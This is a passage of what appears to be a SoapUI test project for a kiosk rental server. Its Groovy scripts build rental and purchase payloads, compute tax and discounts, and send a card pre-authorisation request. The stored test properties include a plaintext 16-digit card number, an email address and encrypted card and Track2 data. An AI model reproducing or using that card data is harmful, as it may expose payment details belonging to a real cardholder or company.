def CardID = encryptCC.getPropertyValue("CardID");
def EncryptedNumber = encryptCC.getPropertyValue("EncryptedNumber");
def EncryptedTrack2 = encryptCC.getPropertyValue("EncryptedTrack2");
def lastFour = encryptCC.getPropertyValue("CardNumber").reverse().take(4).reverse();
def CardType = encryptCC.getPropertyValue("CardType");
//log.info ("KeyID:$KeyID; CardID:$CardID; EncryptedNumber:$EncryptedNumber; EncryptedTrack2:$EncryptedTrack2");

//Get hard coded disc prices and non-return days
def dvdPrice = context.expand( '${#TestSuite#DVDPrice}' );
def blurayPrice = context.expand( '${#TestSuite#BlurayPrice}' );
def gamePrice = context.expand( '${#TestSuite#GamePrice}' );
def dvdNonReturnDays = context.expand( '${#TestSuite#DVDNonReturnDays}' );
def blurayNonReturnDays = context.expand( '${#TestSuite#BlurayNonReturnDays}' );
def gameNonReturnDays = context.expand( '${#TestSuite#GameNonReturnDays}' );
def purchasePrice = context.expand( '${#TestSuite#PurchasePrice}' );
def digitalCodePrice = context.expand( '${#TestSuite#DigitalCodePrice}' );
def KioskId= context.expand( '${#TestCase#KioskId}' )

//Calculate Nonreturn price
def dvdNonreturnPrice = (dvdPrice.toBigDecimal() * dvdNonReturnDays.toBigDecimal());
def blurayNonreturnPrice = (blurayPrice.toBigDecimal() * blurayNonReturnDays.toBigDecimal());
def gameNonreturnPrice = (gamePrice.toBigDecimal() * gameNonReturnDays.toBigDecimal());
log.info ("dvdNonreturnPrice: $dvdNonreturnPrice; blurayNonreturnPrice: $blurayNonreturnPrice; gameNonreturnPrice: $gameNonreturnPrice");
//Get Disc Info
def getDisctc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["GetDiscs"];

//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j<getDisctc.getPropertyCount();j++)
{
   getDisctc.getPropertyAt(j).setValue("");
   //getDisctc.setPropertyValue('ExcludeRentalTitles', '123');
}
//BUILD THE RENTAL and PURCHASE PAYLOAD:
//Grab the barcodes, and product types.
rentalBarcodes = [];
purchaseBarcodes = [];
rentalProductFamily = [];
purchaseProductFamily = [];
rentalProductType = [];
purchaseProductType = [];
rental
rentalPayload = "\"rental\" : { \"Items\" : [";
BigDecimal rentalTotal = 0;
purchasePayload = "\"purchase\" : { \"Items\" : [";
BigDecimal purchaseTotal = 0;
BigDecimal digitalTotal = 0;
rentalTitleIds = []; //will have both rental and purchase titleIds.
int rentalCount = 0;
int purchaseCount = 0;
preauthPayload = "";

def numAddRentals = context.expand( '${#TestCase#numOfRentals}' );
numAddRentalsList = numAddRentals.split(",");
def numAddPurchases = context.expand( '${#TestCase#numOfPurchases}' );
numAddPurchasesList = numAddPurchases.split(",");
BigDecimal discountvalue = (context.expand( '${#TestCase#PromoValue}' ).toBigDecimal()); //PromoCode Value
def rentalFormatIds = context.expand( '${#TestCase#rentalFormats}' );

//Initiate the testCase to filter barcodes
rentalformatIDList = rentalFormatIds.split(",");
log.info ("rentalFormatIds: $rentalFormatIds; rentalformatIDList: $rentalformatIDList");
if (rentalFormatIds == '0' || '')
{
	log.info ("No Rentals in the transaction");
	getDisctc.setPropertyValue('ExcludeRentalTitles', '0');
	getDisctc.setPropertyValue('ExcludePurchaseTitles', '0');
}
else
{
	for (r = 0; r < rentalformatIDList.size(); r++)
	{
	    curformatID = rentalformatIDList[r].toString().trim();
	    log.info ("curformatID: $curformatID");
	    def getFormatName = sql.firstRow("select FormatName AS OID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.OID);     
	    getDisctc.setPropertyValue('FormatID', curformatID);
	    getDisctc.setPropertyValue('FormatName', FormatName);  
	    getDisctc.setPropertyValue('KioskID',KioskId);  
	    //Manually Hardcoded to some value so that SQL query doesnot fail in GetDiscs test Case.  
	    getDisctc.setPropertyValue('ExcludeRentalTitles', '0');    
	    getDisctc.setPropertyValue('ExcludePurchaseTitles', '0');  
	    
	    //Run the test case: GetRecoDiscs
	    def runGetDiscs = getDisctc.run( null, false );
	        
	    // show that it worked out ok
	    log.info("Status: $runGetDiscs.status, time taken for TestCase : [Get Discs] For $FormatName was: $runGetDiscs.timeTaken ms");
	        
	    // assert that it didn't fail
	    assert runGetDiscs.status != Status.FAILED : runGetDiscs.reason
	}
	for (f = 0; f < rentalformatIDList.size(); f++)
	{
	    curformatID = rentalformatIDList[f].toString().trim();
	    def getFormatName = sql.firstRow("select FormatName, FormatTypeID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.FormatName);
	    def formatTypeID = (getFormatName.FormatTypeID.toString());
	    
	    //Get FormatTypeName from FormatIypeID
	    def excuteFormatType = sql.firstRow("Select FormatTypeName from FormatType Where FormatTypeID = $formatTypeID");
	    def formatTypeName = (excuteFormatType.FormatTypeName.toString());
	    def getBarcode = getDisctc.getPropertyValue("$FormatName-Barcodes");
	    def getTitleIDs = getDisctc.getPropertyValue("$FormatName-Titles");    
	    log.info ("getBarcode-$FormatName: $getBarcode");
	    getBarcodeList = getBarcode.split(",");
	    getTitleList = getTitleIDs.split(",");
	    numOfBarcodes = numAddRentalsList[f].toString().trim();
	    log.info ("numOfBarcodes: $numOfBarcodes; FormatName: $FormatName");	
	    //Create a payload for rental items
	    for (b = 0; b < numOfBarcodes.toInteger(); b++)
	    {
	        curBarcodeID = getBarcodeList[b].toString().trim();
	        curTitleID = getTitleList[b].toString().trim();
	        rentalPayload += "{"
	        rentalPayload += "\"Barcode\" : \"$curBarcodeID\","
	        rentalPayload += "\"ProductFamily\" : \"$formatTypeName\","
	        rentalPayload += "\"ProductType\" : \"$FormatName\","
	        if (curformatID == '1') //For DVD
	        {
	            rentalPayload += "\"Prices\" : {"
	            rentalPayload += "\"extranight\" : $dvdPrice,"
	            rentalPayload += "\"expirationprice\" : $dvdPrice,"
	            rentalPayload += "\"initialnight\" : $dvdPrice,"
	            rentalPayload += "\"pricesetid\" : 1,"
	            rentalPayload += "\"nonreturn\" : $dvdNonreturnPrice,"
	            rentalPayload += "\"nonreturndays\" : $dvdNonReturnDays"
	            rentalPayload += "}"
	
	            //Calculate Rental Total
	            rentalTotal += (dvdPrice.toBigDecimal());
	        }
	        else if (curformatID == '2') //For Bluray
	        {
	            rentalPayload += "\"Prices\" : {"
	            rentalPayload += "\"extranight\" : $blurayPrice,"
	            rentalPayload += "\"expirationprice\" : $blurayPrice,"
	            rentalPayload += "\"initialnight\" : $blurayPrice,"
	            rentalPayload += "\"pricesetid\" : 1,"
	            rentalPayload += "\"nonreturn\" : $blurayNonreturnPrice,"
	            rentalPayload += "\"nonreturndays\" : $blurayNonReturnDays"
	            rentalPayload += "}"
	
	            //Calculate Rental Total
	            rentalTotal += (blurayPrice.toBigDecimal());
	        }
	        else //For Games
	        {
	            rentalPayload += "\"Prices\" : {"
	            rentalPayload += "\"extranight\" : $gamePrice,"
	            rentalPayload += "\"expirationprice\" : $gamePrice,"
	            rentalPayload += "\"initialnight\" : $gamePrice,"
	            rentalPayload += "\"pricesetid\" : 1,"
	            rentalPayload += "\"nonreturn\" : $gameNonreturnPrice,"
	            rentalPayload += "\"nonreturndays\" : $gameNonReturnDays"
	            rentalPayload += "}"
	
	            //Calculate Rental Total
	            rentalTotal += (gamePrice.toBigDecimal());
	        }
	        //rentalPayload += ",\"SourceType\" : 1"  --NEEDED ONLY FOR RECO (RESVAUTH AND MODRESVPICKUP
	        rentalPayload += "}" 
	           
		   //Prepare it as List.
		   rentalTitleIds.add(curTitleID);
		   rentalBarcodes.add(curBarcodeID);
		   rentalProductFamily.add(formatTypeName);
		   rentalProductType.add(FormatName);
	        rentalCount += 1;
	        if (b+1 < numOfBarcodes.toInteger())
	        {
	            rentalPayload += ","
	        } 
	    }	    
	    if (f+1 < rentalformatIDList.size())
	    {
	        rentalPayload += ","
	    }  
	    //testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
	    getDisctc.setPropertyValue('ExcludeRentalTitles', rentalTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalBarcodes', rentalBarcodes.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalProductFamily', rentalProductFamily.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalProductType', rentalProductType.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalCount', rentalCount.toString());
	}
	
	//Rounding the rental Total
	rentalTotal = Round16.format(rentalTotal).toBigDecimal();
	discountvalue = Round16.format(discountvalue).toBigDecimal();
	log.info ("Rentals Total: $rentalTotal; Promo Amount: $discountvalue");
	BigDecimal discountedSubTotal
	if (rentalTotal <= discountvalue)	{ discountedSubTotal = 0 }
	else { discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	
	// Rounding Discounted SubTotal 
	discountedSubTotal = Round16.format(discountedSubTotal).toBigDecimal();
	log.info("Rentals Discounted Total: " + discountedSubTotal);
	BigDecimal renttaxRate = ((context.expand( '${#TestCase#RentalTaxRate}').toBigDecimal()) / 100)
	BigDecimal rentalTaxAmt = (Round16.format(discountedSubTotal).toBigDecimal()) * ((renttaxRate).toBigDecimal());
	rentalTaxAmt = Round16.format(rentalTaxAmt).toBigDecimal();
	log.info("Rentals Tax Amount: " + rentalTaxAmt);
	
	BigDecimal grandTotal = discountedSubTotal + rentalTaxAmt;
	// trying to solve some rounding issues
	grandTotal = Round16.format(grandTotal).toBigDecimal();
	log.info("Rentals Grand Total: " + grandTotal);
	
	// add totals to the strings
	rentalPayload += "], \"Totals\" : { \"TaxRate\" : " + context.expand( '${#TestCase#RentalTaxRate}') + ", \"Subtotal\" : " + rentalTotal + ", \"DiscountedSubtotal\" : " + discountedSubTotal + ", \"TaxAmount\" : \"" + rentalTaxAmt + "\", \"GrandTotal\" : " + grandTotal + " } }";
	testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
}

//Purchase payload
def purchaseFormatIds = context.expand( '${#TestCase#PurchaseFormats}' );
//Initiate the testCase to filter barcodes
purchaseformatIDList = purchaseFormatIds.split(",");
log.info ("purchaseformatIDList: $purchaseformatIDList");
if (purchaseFormatIds == '0' || '')
{
	log.info ("No Purchases in the transaction");
}
else
{
	for (r = 0; r < purchaseformatIDList.size(); r++)
	{
	    curPurchaseFormatID = purchaseformatIDList[r].toString().trim();
	    log.info ("PurchaseFormatID: $curPurchaseFormatID");
	    def getFormatName = sql.firstRow("select FormatName AS OID from Format where FormatID = $curPurchaseFormatID");
	    def purchaseFormatName = (getFormatName.OID);
	    getDisctc.setPropertyValue('FormatID', curPurchaseFormatID);
	    getDisctc.setPropertyValue('FormatName', purchaseFormatName);  
	    getDisctc.setPropertyValue('KioskID',KioskId);  	    
	    //Run the test case: GetRecoDiscs
	    def runGetDiscs = getDisctc.run( null, false );
	        
	    // show that it worked out ok
	    log.info("Status: $runGetDiscs.status, time taken for TestCase : [Get Discs] For $purchaseFormatName was: $runGetDiscs.timeTaken ms");
	        
	    // assert that it didn't fail
	    assert runGetDiscs.status != Status.FAILED : runGetDiscs.reason
	}
	for (f = 0; f < purchaseformatIDList.size(); f++)
	{
	    curformatID = purchaseformatIDList[f].toString().trim();
	    def getFormatName = sql.firstRow("select FormatName, FormatTypeID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.FormatName);
	    def formatTypeID = (getFormatName.FormatTypeID.toString());
	    
	    //Get FormatTypeName from FormatIypeID
	    def excuteFormatType = sql.firstRow("Select FormatTypeName from FormatType Where FormatTypeID = $formatTypeID");
	    def formatTypeName = (excuteFormatType.FormatTypeName.toString());
	    
	    def getBarcode = getDisctc.getPropertyValue("$FormatName-Barcodes");
	    def getTitleIDs = getDisctc.getPropertyValue("$FormatName-Titles");    
	    log.info ("getBarcode-$FormatName: $getBarcode");
	    getBarcodeList = getBarcode.split(",")
	    getTitleList = getTitleIDs.split(",")
	
	    numOfPurchaseBarcodes = numAddPurchasesList[f].toString().trim()
	    log.info ("numOfPurchaseBarcodes: $numOfPurchaseBarcodes; FormatName: $FormatName");
	
	    for (b = 0; b < numOfPurchaseBarcodes.toInteger(); b++)
	    {
	        curBarcodeID = getBarcodeList[b].toString().trim();
	        curTitleID = getTitleList[b].toString().trim();
	        purchasePayload += "{"
	        purchasePayload += "\"Barcode\" : \"$curBarcodeID\","
	        
	        if (curformatID == '17') //DigitalCode Json
	        {
	            purchasePayload += "\"ProductFamily\" : \"$formatTypeName\","
	        	  purchasePayload += "\"ProductType\" : \"$FormatName\","
	            purchasePayload += "\"Prices\" : {"
	            purchasePayload += "\"purchase\" : $digitalCodePrice,"
	            purchasePayload += "\"expirationprice\" : $digitalCodePrice,"
	            purchasePayload += "\"pricesetid\" : 1"
	            purchasePayload += "}"
	
	            //Calculate Rental Total
	            digitalTotal += (digitalCodePrice.toBigDecimal());
	        }
	        else  //Regular Purchase of DVD, Bluray, or Game
	        {
	            purchasePayload += "\"ProductFamily\" : \"$formatTypeName\","
	        	  purchasePayload += "\"ProductType\" : \"$FormatName\","
	            purchasePayload += "\"Prices\" : {"
	            purchasePayload += "\"purchase\" : $purchasePrice,"
	            purchasePayload += "\"expirationprice\" : $purchasePrice,"
	            purchasePayload += "\"pricesetid\" : 1"
	            purchasePayload += "}"
	
	            //Calculate Rental Total
	            purchaseTotal += (purchasePrice.toBigDecimal());
	        }
	        
	        //purchasePayload += ",\"SourceType\" : 1" --NEEDED ONLY FOR RECO (RESVAUTH AND MODRESVPICKUP
	        purchasePayload += "}"    
		   //Combine the list
		   rentalTitleIds.add(curTitleID);
	        purchaseBarcodes.add(curBarcodeID);
	        purchaseProductFamily.add(formatTypeName);
	    	   purchaseProductType.add(FormatName);
	        //Count num of purchase.
	        purchaseCount += 1;
	        if (b+1 < numOfPurchaseBarcodes.toInteger())
	        {
	            purchasePayload += ","
	        } 
	    }
	    
	
	    if (f+1 < purchaseformatIDList.size())
	    {
	        purchasePayload += ","
	    }
	    getDisctc.setPropertyValue('ExcludeRentalTitles', rentalTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseBarcodes', purchaseBarcodes.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseProductFamily', purchaseProductFamily.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseProductType', purchaseProductType.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseCount', purchaseCount.toString());
	}
	
	//Purchase Calculation	
	BigDecimal totalPurchaseTotal = (purchaseTotal.toBigDecimal() + digitalTotal.toBigDecimal())
	log.info ("totalPurchaseTotal: $totalPurchaseTotal");
	
	def purchasetaxRate = context.expand( '${#TestCase#PurchaseTaxRate}');
	def digitalpurchasetaxRate = context.expand( '${#TestCase#DigitalPurchaseTaxRate}');
	if (digitalpurchasetaxRate == null || digitalpurchasetaxRate == "null" || digitalpurchasetaxRate == "") //If digitalpurchasetaxrate is null than use Purchase tax rate.
	{
		BigDecimal digitaltaxRate = ((purchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	else //if digitalpurchasetaxrate is not null than use that ever is provided.
	{
		BigDecimal digitaltaxRate = ((digitalpurchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	def totaldigitalpurchasetaxAmount = context.expand( '${#TestCase#digitalpurchaseTaxAmt}');
		
	BigDecimal purchaseTaxAmt = (Round16.format(purchaseTotal).toBigDecimal()) * ((purchasetaxRate).toBigDecimal()/100);
	purchaseTaxAmt = Round16.format(purchaseTaxAmt).toBigDecimal();
	
	log.info ("Digital Purchase Tax Amount: $totaldigitalpurchasetaxAmount; Purchase Tax Amount: $purchaseTaxAmt");
	def totalTaxAmount = (totaldigitalpurchasetaxAmount.toBigDecimal() + purchaseTaxAmt.toBigDecimal());
	BigDecimal purchaseGrandTotal = (totalPurchaseTotal + totalTaxAmount).toBigDecimal();
	log.info("Purchase Grand Total: $purchaseGrandTotal; Total Tax Amount: $totalTaxAmount");
	
	// add totals to the strings
	purchasePayload += "], \"Totals\" : { \"TaxRate\" : " + context.expand('${#TestCase#purchasetaxrate}') + ", \"Subtotal\" : " + totalPurchaseTotal + ", \"DiscountedSubtotal\" : " + totalPurchaseTotal + ", \"TaxAmount\" : \"" + totalTaxAmount + "\", \"GrandTotal\" : " + purchaseGrandTotal + " } }";

	testRunner.testCase.setPropertyValue("purchasePayload",purchasePayload);
}
//log.info ("purchasePayload: $purchasePayload");
//log.info ("rentalPayload: $rentalPayload");

def MessageId = UUID.randomUUID().toString();
def PromoCode = context.expand( '${#TestCase#PromoCode}');
def UseCredits = context.expand( '${#TestCase#UseCredits}');
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));

//Build PreAuth Request
preauthPayload += "{";
preauthPayload += "\"TransactionDate\": {";
preauthPayload += "\"theDate\": $theDate,";
preauthPayload += "\"dateTimeKind\": \"Unspecified\",";
preauthPayload += "\"dateString\": \"$dateString\"";
preauthPayload += "},";
preauthPayload += "\"CreditCard\": {";
preauthPayload += "\"FirstName\": \"Redbox\",";
preauthPayload += "\"LastName\": \"Server\",";
preauthPayload += "\"Number\": \"$EncryptedNumber\",";
preauthPayload += "\"PostalCode\": \"60181\",";
preauthPayload += "\"ExpirationMonth\": \"12\",";
preauthPayload += "\"ExpirationYear\": \"20\",";
preauthPayload += "\"KeyId\": $KeyID,";
preauthPayload += "\"CardId\": \"$CardID\",";
preauthPayload += "\"LastFour\": \"$lastFour\",";
preauthPayload += "\"CardType\": $CardType,";
preauthPayload += "\"Track2\": \"$EncryptedTrack2\"";
preauthPayload += "},";
preauthPayload += "\"Contents\": {";
if (rentalCount > 0 && purchaseCount == 0) {
	preauthPayload += "$rentalPayload";
} else if (rentalCount == 0 && purchaseCount > 0) {
	preauthPayload += "$purchasePayload";
} else if (rentalCount > 0 && purchaseCount > 0) {
	preauthPayload += "$rentalPayload,$purchasePayload";
} else {
	log.info("No rental or purchase information generated!");
}
preauthPayload += "},";
if (PromoCode == "" || PromoCode == "null" || PromoCode == null)
{
	preauthPayload += "\"DiscountCode\": null,";
}
else
{
	preauthPayload += "\"DiscountCode\": \"$PromoCode\",";
}
preauthPayload += "\"DiscountValue\": $discountvalue,";
preauthPayload += "\"UseCredits\": \"$UseCredits\",";
preauthPayload += "\"MessageId\": \"$MessageId\",";
preauthPayload += "\"KioskId\": $KioskId,";
preauthPayload += "\"EngineVersion\": \"1.15.0.6\",";
preauthPayload += "\"BundleVersion\": \"2.2.2.82\",";
preauthPayload += "\"MessageType\": \"PreAuth\",";
preauthPayload += "\"UseMessageControl\": false";
preauthPayload += "}";

// log to soapui log
log.info("preauthPayload: $preauthPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(preauthPayload)
testRunner.testCase.setPropertyValue("preAuthRequestBody",result)]]></script></con:config></con:testStep><con:testStep type="httprequest" name="PreAuth (Request)" id="c88a760b-5ff8-4915-a457-b73a97ba63d8" disabled="true"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" name="PreAuth (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" id="b2fa5210-dde2-4787-8c9d-57bcd781cdfc" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#preAuthRequestBody}</con:request><con:assertion type="GroovyScriptAssertion" name="Check for Success and HasErrors" id="70bc7102-0d46-4704-81fc-09b7237cee25"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent())

	assert response.contains("\"Success\":true,")
	assert response.contains("\"HasErrors\":false,")

</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>Basic</con:selectedAuthProfile><con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>Basic</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>Basic</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="Save PreAuth Response" id="988ca46f-4ba4-4f59-948d-057ba9642923" disabled="true"><con:settings/><con:config><script>import groovy.json.JsonSlurper
def encodedBody = testRunner.testCase.getTestStepByName('PreAuth (Request)').getPropertyValue('Response')
//log.info(encodedBody)
def decodedBody = URLDecoder.decode(encodedBody)
//log.info(decodedBody)
def list = new JsonSlurper().parseText( decodedBody )
def promptRequired = list.get('PromptRequired').toString();
def authRuleId = list.get('AuthRuleId').toString();
def authDays = list.get('AuthDays').toString();
def authAmount = list.get('AuthAmount').toString();
def skipAuthRule = list.get('SkipAuthRule').toString();
def success = list.get('Success').toString();
log.info("PromptRequired: $promptRequired; AuthRuleId: $authRuleId; AuthDays: $authDays; AuthAmount: $authAmount; SkipAuthRule: $skipAuthRule; Success: $success");
testRunner.testCase.setPropertyValue("PromptRequired", promptRequired);
testRunner.testCase.setPropertyValue("AuthRuleId", authRuleId);
testRunner.testCase.setPropertyValue("AuthDays", authDays);
testRunner.testCase.setPropertyValue("AuthAmount", authAmount);
testRunner.testCase.setPropertyValue("SkipAuthRule", skipAuthRule);
testRunner.testCase.setPropertyValue("PreAuthSuccess", success);

log.info 'Pre-Auth Step Completed';</script></con:config></con:testStep><con:setupScript>import groovy.sql.Sql
log.info("Loading SQL Driver for Auth");
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
log.info("End loading SQL Driver for Auth");</con:setupScript><con:tearDownScript><![CDATA[//if results file global property is populated,  
//record the testcase name with id
//add mingle card link if mingle property is set

def file = new File(context.expand( '${ResultsFile}' ))
if (context.expand( '${ResultsFile}' ) != null && file.exists()) {
file.append(testRunner.testCase.name + "</td><td><a href=\"http://mingle:8080/projects/server_platform/cards/" + 
context.expand('${#TestCase#Mingle}') + "\">" +context.expand('${#TestCase#Mingle}') +
"</a></td><td>" + context.expand('${#TestCase#Id}') + '\r\n')
} 
]]></con:tearDownScript><con:properties><con:property><con:name>Email</con:name><con:value>redbox.rentalserver@gmail.com</con:value></con:property><con:property><con:name>CCNumber</con:name><con:value>4241360117128248</con:value></con:property><con:property><con:name>CCType</con:name><con:value>5</con:value></con:property><con:property><con:name>PromoCode</con:name><con:value>DVDONME</con:value></con:property><con:property><con:name>PromoValue</con:name><con:value>1</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>rentalFormats</con:name><con:value>1</con:value></con:property><con:property><con:name>numOfRentals</con:name><con:value>1</con:value></con:property><con:property><con:name>PurchaseFormats</con:name><con:value>0</con:value></con:property><con:property><con:name>numOfPurchases</con:name><con:value>0</con:value></con:property><con:property><con:name>SetDaysBack</con:name><con:value>0</con:value></con:property><con:property><con:name>UseCredits</con:name><con:value>0</con:value></con:property><con:property><con:name>DVDCredits</con:name><con:value>0</con:value></con:property><con:property><con:name>MovieCredits</con:name><con:value>0</con:value></con:property><con:property><con:name>GameCredits</con:name><con:value>0</con:value></con:property><con:property><con:name>rentalPayload</con:name><con:value>"rental" : { "Items" : [{"Barcode" : "004721614","ProductFamily" : "Movies","ProductType" : "DVD","Prices" : {"extranight" : 1.50,"expirationprice" : 1.50,"initialnight" : 1.50,"pricesetid" : 1,"nonreturn" : 24.00,"nonreturndays" : 16}}], "Totals" : { "TaxRate" : 9.9990, "Subtotal" : 1.5, "DiscountedSubtotal" : 0.5, "TaxAmount" : "0.049995", "GrandTotal" : 0.549995 } }</con:value></con:property><con:property><con:name>purchasePayload</con:name><con:value>"purchase" : { "Items" : [{"Barcode" : "007880939","ProductFamily" : "Movies","ProductType" : "DVD","Prices" : {"purchase" : 8,"expirationprice" : 8,"pricesetid" : 1}},{"Barcode" : "000150730","ProductFamily" : "Movies","ProductType" : "DigitalCode","Prices" : {"purchase" : 15,"expirationprice" : 15,"pricesetid" : 1}},{"Barcode" : "000150731","ProductFamily" : "Movies","ProductType" : "DigitalCode","Prices" : {"purchase" : 15,"expirationprice" : 15,"pricesetid" : 1}}], "Totals" : { "TaxRate" : 8.8800, "Subtotal" : 38, "DiscountedSubtotal" : 38, "TaxAmount" : "0.7104", "GrandTotal" : 38.7104 } }</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.9990</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.8800</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>digitalpurchaseTaxAmt</con:name><con:value>0</con:value></con:property><con:property><con:name>preAuthRequestBody</con:name><con:value>payload=%7B%22TransactionDate%22%3A+%7B%22theDate%22%3A+636432403546960000%2C%22dateTimeKind%22%3A+%22Unspecified%22%2C%22dateString%22%3A+%222017-10-10T08%3A52%3A34.0000696%22%7D%2C%22CreditCard%22%3A+%7B%22FirstName%22%3A+%22Redbox%22%2C%22LastName%22%3A+%22Server%22%2C%22Number%22%3A+%22lqNhTPcGwe%2FhVQ0uZZERVWFuM3j6sPcHguA5WlOXygt6KTMh5UpuQQH5sgk25Q0OUGeHiWomVexpup0xFJGBoD1o7I3avpCsx5u3N0nyBcXiGol0t9VEXbsBV4A4aft9gOgF4WDB%2BSh1na132eV1gAnrx%2BwzLA4eV5BJaHJ2bjUu3oa3%2FJK9Amz%2B7gLu4JOBbjnhoRRJJcIOAgF3d%2B42pxro%2BorinFgnOITc5%2BM9%2FZo9uUSSZhh%2Bo4B%2B36qYDLZbS0zKPgc%2BerGzYWc%2BYMGpJyFEklUhIXo1rLvNp9qxJXrq6dXpdwlBnz%2Bz2cwi2rcioVWikcaZxbBA%2FxmNiCmVHcs3uaOy5BkgoaZRUevMkqEoJaUe5JKxQ%2F0CHBsqbWXdFQa%2Bo4X%2FkAe4s8kT7hXJ%2FeOzNZVVlRMVm8KA2P3TU6fKLsE00BS8WJ8aPgPMc2uW2ISbulkM%2ByM0qAPv%2BQOQzTeDFuhUrzlZjedS6MK2Jfn2QZrGG%2FIwz8ylriouHufqy3aaFmgi5ppy8yODj6KIug143%2FhFt%2BW%2FYZhQRZ1U%2FrQQiW9pBHEQdE1VUbYrKye1wHZw%2BCXs3Qfw1E4HhskG4EGlCd8Ee8qpwuiusoHQ4uqMM0ljIFrA5PyE6o7RE51f1jV4bsR%2BsQ2ye5Mz%2FPNVPF77nvSkGapfFuAN8zgeoYk%3D%22%2C%22PostalCode%22%3A+%2260181%22%2C%22ExpirationMonth%22%3A+%2212%22%2C%22ExpirationYear%22%3A+%2220%22%2C%22KeyId%22%3A+100002%2C%22CardId%22%3A+%22GKJYPHtONN9DnUcjmpP1CxkAH6nAW%2B1K0cmZuGt0NSM%3D%22%2C%22LastFour%22%3A+%228248%22%2C%22CardType%22%3A+5%2C%22Track2%22%3A+%22MLhxUzTUzD%2FowpdeCMp%2F%2BN%2BfGBTjEHRZvIWJYvN7RNxFToPEHvjxlaf35kHBlywpWFbQwWR407MMiqAhIHERJB%2FD1BDuVKY%2FcBZaH2pa7kIrjOWikH6k1tT1o%2Fy%2FqxRyBq1ghU%2B%2FMlkLvyI%2FyU0KUqdjyrLBtoviqf%2B%2BO297I6C%2FR98Li%2F0K%2FRaTj3Q4C8zLK%2FxSJejcs01ECGV8w4NUI%2Ba62qFl1eG3FqolitlPlcay%2BXBIcaLYVAAkJAcHRKrHGPAxuIOzJag0q8xu6jqvIi0Zv3xnSIAljEH7VzJo2S55gxMYS8mqCKEV6QuBcgjWk7rq08EdZU9K6wln%2Bbn%2FZ65%2BpmQXDcMprTQ%2FUIVgHZIHQ4tcP2LvHLN6Y8AMbKypa0VIoXTc8%2FnQK3o%2BfQjQ%2BM7gS%2BNSpxToLCsQnJnyUchD%2F%2B4f2Y8pYExFEQ7pbonXKpkE9cIvFszkMigpCsSXBeMESNhUlg0r1tL4kschNrIl4PmnvCptQ2zYif4R92OvGTBRwBrgfxS1U%2Biqy%2Fi4miCm%2FJgg6gGcuoDbFdMpFu9mGQA2YVmOp5YHmGzOTR0R1P81zPPrp1DDH%2BcsAl7rUTigUBQbUtcwOp8FfBlrvcDn12hLIciDDE2gp1faJfUDKYUj1zD4pwgKaft4GGyPPZ%2FHUBcuRf02MdwjjPFViJ4%3D%22%7D%2C%22Contents%22%3A+%7B%22rental%22+%3A+%7B+%22Items%22+%3A+%5B%7B%22Barcode%22+%3A+%22004721614%22%2C%22ProductFamily%22+%3A+%22Movies%22%2C%22ProductType%22+%3A+%22DVD%22%2C%22Prices%22+%3A+%7B%22extranight%22+%3A+1.50%2C%22expirationprice%22+%3A+1.50%2C%22initialnight%22+%3A+1.50%2C%22pricesetid%22+%3A+1%2C%22nonreturn%22+%3A+24.00%2C%22nonreturndays%22+%3A+16%7D%7D%5D%2C+%22Totals%22+%3A+%7B+%22TaxRate%22+%3A+9.9990%2C+%22Subtotal%22+%3A+1.5%2C+%22DiscountedSubtotal%22+%3A+